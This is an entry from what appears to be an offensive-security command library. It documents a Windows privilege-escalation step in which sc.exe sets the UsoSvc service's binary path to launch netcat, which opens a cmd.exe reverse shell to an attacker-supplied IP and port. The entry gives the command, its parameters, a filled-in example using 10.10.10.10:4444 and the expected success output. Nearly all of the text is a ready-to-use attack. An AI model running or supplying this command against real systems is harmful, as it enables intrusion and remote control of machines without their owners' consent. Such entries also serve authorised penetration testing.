---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
name: Configure UsoSvc BinPath CMD NC
type: command
executor: cmd
data: >-
  sc.exe config UsoSvc binpath= "cmd /C C:\Users\nc.exe $_ATTACKER_IP
  $_ATTACKER_PORT -e cmd.exe"
output: null
created_at: '2023-04-06T03:56:29.494877+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - service-exploitation
verified: true
validated: true
---

# Configure UsoSvc BinPath CMD NC

## Command

```cmd
sc.exe config UsoSvc binpath= "cmd /C C:\Users\nc.exe $_ATTACKER_IP $_ATTACKER_PORT -e cmd.exe"
```

## Description

Configures the service to use cmd.exe as a wrapper for reliable execution of the netcat reverse shell.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `config` | Change configuration | Yes |
| `UsoSvc` | Service name | Yes |
| `binpath=` | Binary path with cmd wrapper | Yes |
| `$_ATTACKER_IP` | IP for reverse connection | Yes |
| `$_ATTACKER_PORT` | Port for reverse connection | Yes |

## Examples

### Basic Usage

```cmd
sc.exe config UsoSvc binpath= "cmd /C C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

## Expected Output

[SC] ChangeServiceConfig SUCCESS

## Related

- [[procedures/usosvc-service-account-remote-command-execution]]
- [[commands/start-usosvc-service]]
